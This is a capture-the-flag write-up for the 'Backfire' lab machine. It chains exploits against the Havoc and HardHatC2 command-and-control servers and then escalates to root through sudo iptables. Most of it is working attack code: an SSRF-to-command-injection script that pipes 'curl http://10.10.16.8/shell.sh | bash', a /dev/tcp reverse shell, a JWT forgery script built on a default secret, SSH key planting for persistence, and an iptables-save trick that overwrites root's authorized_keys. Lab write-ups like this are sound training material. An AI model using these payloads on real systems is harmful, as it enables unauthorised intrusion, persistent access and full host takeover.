1,Recon
port scan
```
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
|_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
443/tcp  open     ssl/http nginx 1.22.1
| ssl-cert: Subject: commonName=127.0.0.1/stateOrProvinceName=Illinois/countryName=US
| Subject Alternative Name: IP Address:127.0.0.1
| Not valid before: 2024-11-04T04:54:53
|_Not valid after:  2027-11-04T04:54:53
|_http-server-header: nginx/1.22.1
|_http-title: 404 Not Found
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
5000/tcp filtered upnp
8000/tcp open     http     nginx 1.22.1
|_http-title: Index of /
|_http-open-proxy: Proxy might be redirecting requests
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 11:31  disable_tls.patch
| 875   17-Dec-2024 11:34  havoc.yaotl
|_
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Page check
![](images/Pasted%20image%2020250121021349.png)
Then we can get these files:
```
disable_tls.patch
Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so 
this will not compromize our teamserver

diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
index abdf1b5..6be76fb 100644
--- a/client/src/Havoc/Connector.cc
+++ b/client/src/Havoc/Connector.cc
@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
 {
     Teamserver   = ConnectionInfo;
     Socket       = new QWebSocket();
-    auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+    auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
     auto SslConf = Socket->sslConfiguration();
 
     /* ignore annoying SSL errors */
     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
-    Socket->setSslConfiguration( SslConf );
     Socket->ignoreSslErrors();
 
     QObject::connect( Socket, &QWebSocket::binaryMessageReceived, this, [&]( const QByteArray& Message )
diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
index 9d1c21f..59d350d 100644
--- a/teamserver/cmd/server/teamserver.go
+++ b/teamserver/cmd/server/teamserver.go
@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
                }
 
                // start the teamserver
-               if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+               if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
                        logger.Error("Failed to start websocket: " + err.Error())
                }

```
and
```
havoc.yaotl                              
Teamserver {
    Host = "127.0.0.1"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1" 
        PortBind = 8443
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}
```
That looks like a config of havoc
```
配置文件是用于 Havoc 的一个配置文件，Havoc 是一种现代的 C2（Command and Control）框架，类似于 Cobalt Strike，常用于 红队 和渗透测试的远程管理和后门植入
```
By check the exploits of `Havoc`
![](images/Pasted%20image%2020250121224607.png)
Then we can get the exploit script from github
`https://github.com/chebuya/Havoc-C2-SSRF-poc.git`
But just use this script, we can only get the Sensitive Information
```
伪造 agent 注册：通过发送伪造的 agent 注册请求，触发目标服务器执行一些操作（如打开套接字）。
打开套接字：通过特定的命令控制目标服务器打开套接字，允许远程连接。
写数据到套接字：向服务器开放的套接字写入数据，可以用于进一步的请求。
读取套接字数据：读取目标服务器响应的数据，获取敏感信息（例如 IP 地址）。
```
And we want to get the reverse shell to control the machine, so let's find another script for `c2-vulner`
`https://github.com/IncludeSecurity/c2-vulnerabilities.git`
There is a blog about Vulnerabilities in Open Source C2 Frameworks.
`https://blog.includesecurity.com/2024/09/vulnerabilities-in-open-source-c2-frameworks/`
```
WebSocket 连接：通过 WebSocket（加密的 wss://）与远程团队服务器建立连接。
身份验证：使用用户名和 SHA3-256 加密的密码进行身份验证。
监听器创建：向服务器发送请求创建一个监听器，用于构建 “demon agent”。
远程命令执行：通过命令注入漏洞，向服务器发送恶意载荷来执行本地命令（RCE）
```
We have to change this script and let them can be leak information and exploit the rce.
```
import binascii
import json
import random
import requests
import argparse
import urllib3
import os
import hashlib
urllib3.disable_warnings()
 
 
from Crypto.Cipher import AES
from Crypto.Util import Counter
 
key_bytes = 32
 
def decrypt(key, iv, ciphertext):
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b"0"
 
    assert len(key) == key_bytes
 
    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)
 
    plaintext = aes.decrypt(ciphertext)
    return plaintext
 
 
def int_to_bytes(value, length=4, byteorder="big"):
    return value.to_bytes(length, byteorder)
 
 
def encrypt(key, iv, plaintext):
 
    if len(key) <= key_bytes:
        for x in range(len(key),key_bytes):
            key = key + b"0"
 
        assert len(key) == key_bytes
 
        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)
 
        ciphertext = aes.encrypt(plaintext)
        return ciphertext
 
def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    # DEMON_INITIALIZE / 99
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id
 
    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)
 
    data =  b"\xab" * 100
 
    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data
 
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
 
    print("[***] Trying to register agent...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")
 
 
def open_socket(socket_id, target_address, target_port):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"
 
    # SOCKET_COMMAND_OPEN / 16
    subcommand = b"\x00\x00\x00\x10"
    sub_request_id = b"\x00\x00\x00\x03"
 
    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"
 
 
    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)
 
    forward_port = int_to_bytes(target_port)
 
    package = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port
    package_size = int_to_bytes(len(package) + 4)
 
    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)
 
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data
 
 
    print("[***] Trying to open socket on the teamserver...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")
 
 
def write_socket(socket_id, data):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"
 
    # SOCKET_COMMAND_READ / 11
    subcommand = b"\x00\x00\x00\x11"
    sub_request_id = b"\x00\x00\x00\xa1"
 
    # SOCKET_TYPE_CLIENT / 3
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"
 
    data_length = int_to_bytes(len(data))
 
    package = subcommand+socket_id+socket_type+success+data_length+data
    package_size = int_to_bytes(len(package) + 4)
 
    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)
 
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data
 
    print("[***] Trying to write to the socket")
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")
 
 
def read_socket(socket_id):
    # COMMAND_GET_JOB / 1
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"
 
    header_data = command + request_id
 
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data
 
 
    print("[***] Trying to poll teamserver for socket output...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""
 
 
    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]
 
    return decrypt(AES_Key, AES_IV, enc_package)[12:]
 
def create_websocket_request(host, port):
    request = (
        f"GET /havoc/ HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    ).encode()
    return request
 
def build_websocket_frame(payload):
    payload_bytes = payload.encode("utf-8")
    frame = bytearray()
    frame.append(0x81)
    payload_length = len(payload_bytes)
    if payload_length <= 125:
        frame.append(0x80 | payload_length)
    elif payload_length <= 65535:
        frame.append(0x80 | 126)
        frame.extend(payload_length.to_bytes(2, byteorder="big"))
    else:
        frame.append(0x80 | 127)
        frame.extend(payload_length.to_bytes(8, byteorder="big"))
 
    masking_key = os.urandom(4)
    frame.extend(masking_key)
    masked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes))
    frame.extend(masked_payload)
 
    return frame
 
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=True)
parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)
parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent", default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
parser.add_argument("-u", "--username", help="The username for the spoofed agent", default="Administrator")
parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")
 
args = parser.parse_args()
 
 
# 0xDEADBEEF
magic = b"\xde\xad\xbe\xef"
teamserver_listener_url = args.target
headers = {
        "User-Agent": args.user_agent
}
agent_id = int_to_bytes(random.randint(100000, 1000000))
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16
hostname = bytes(args.hostname, encoding="utf-8")
username = bytes(args.username, encoding="utf-8")
domain_name = bytes(args.domain_name, encoding="utf-8")
internal_ip = bytes(args.internal_ip, encoding="utf-8")
process_name = args.process_name.encode("utf-16le")
process_id = int_to_bytes(random.randint(1000, 5000))
 
register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)
 
socket_id = b"\x11\x11\x11\x11"
open_socket(socket_id, args.ip, int(args.port))
 
HOSTNAME = "127.0.0.1"
PORT = 40056
USER = "ilya"
PASSWORD = "CobaltStr1keSuckz!"
 
 
#upgrade http to websocet  so that we can use the second script
write_socket(socket_id,create_websocket_request(host=HOSTNAME, port=PORT))
 
# Authenticate to teamserver
payload = {"Body": {"Info": {"Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(), "User": USER}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": USER}}
payload_json=json.dumps(payload)
write_socket(socket_id, build_websocket_frame(payload_json))
 
 
 
# Create a listener to build demon agent for
payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRotation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443","Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":"","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":"","Time":"08:39:18","User": USER}}
payload_json=json.dumps(payload)
write_socket(socket_id, build_websocket_frame(payload_json))
 
 
# Create a psuedo shell with RCE loop   Change Here
cmd = 'curl http://10.10.16.8/shell.sh | bash'
 
injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
# Command injection in demon compilation command
payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
    "Event": 5, "OneTime": "true", "Time": "18:39:04", "User": USER}}
 
payload_json=json.dumps(payload)
write_socket(socket_id, build_websocket_frame(payload_json))
```
Then remember to write a shell.sh
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.8/443 0>&1
```

Then run the script
`python3 exploit.py --target https://10.10.11.49/ -i 127.0.0.1 -p 40056`
Then we can get shell as ilya
Since this rebound shell will be disconnected after a while, we need to find a way to maintain a persistent connection

Append the local ssh public key to ilya's key file
```
echo "your key" >> ~/.ssh/authorized_keys
```

2, shell as root
Then we can check the directory of ilya
```
ilya@backfire:~$ ls
files  hardhat.txt  Havoc  user.txt
ilya@backfire:~$ cat hardhat.txt 
Sergej said he installed HardHatC2 for testing and  not made any changes to the defaults
I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go > C# 

```
This place metioned the HardHatC2, I would continue to check its exploits.
Then I found
![](images/Pasted%20image%2020250121234958.png)

Then I would continue to check the netstate of the this machine
```
ilya@backfire:~$ netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:7096            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:40056         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Firstly, I would port forwarding the port 5000 and 7096 to the local machine
```
[root@kali] /home/kali/Backfire  
❯ ssh -i ~/.ssh/id_rsa ilya@backfire.htb -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000
```

Then run the exploits script of blog 
```
# @author Siam Thanat Hack Co., Ltd. (STH)
import jwt
import datetime
import uuid
import requests
 
rhost = '127.0.0.1:5000'
 
# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()
 
expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}
 
token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)
 
# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "sth_pentest",
  "role": "TeamLead",
  "username": "sth_pentest"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
```

Then we can use certification `sth_pentest`:`sth_pentest` to login the `https://127.0.0.1:7096`
![](images/Pasted%20image%2020250122003059.png)
Then just add the public key to this user `sergej@backfire` 
And we can use ssh to connect it.
By check `sudo -l`, we found 
```
sergej@backfire:~$ sudo -l
Matching Defaults entries for sergej on backfire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save
```
By google `iptables privsec`, we can find `https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/` this blog give us the hints to get the root shell.
```
Evilege Priscalation
This section will demonstrate how core and side features of the iptables and iptables-save commands, plus some Linux quirks, can be chained together in order to obtain arbitrary code execution.

Spoiler alert, it boils down to these three steps:

Using the comment functionality offered by iptables to attach arbitrary comments, containing newlines, to rules.
Leverage iptables-save to dump to a sensitive file the content of the loaded rules, including the comment payloads.
Exploiting step 1 and step 2 to overwrite the /etc/passwd file with an attacker-controlled root entry, crafted with a known password.
In the following sections, we will give some more details on these steps.
```

The comment function is used to overwrite other files, so you can consider overwriting some sensitive files, especially those that can forge the root identity.
`sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nYourKeysHere\n'`

After testing, the length of this comment cannot be too long, so the length of the ssh key should be relatively short.So we can use ed25519
`ssh-keygen -t ed25519`

Then overwrite the root key file
```
sergej@backfire:~$ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n your_ed25519_pub_keys\n'
 
sergej@backfire:~$ sudo /usr/sbin/iptables -S
 
sergej@backfire:~$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
   
```

Finally use ssh to connect it and get the root shell.
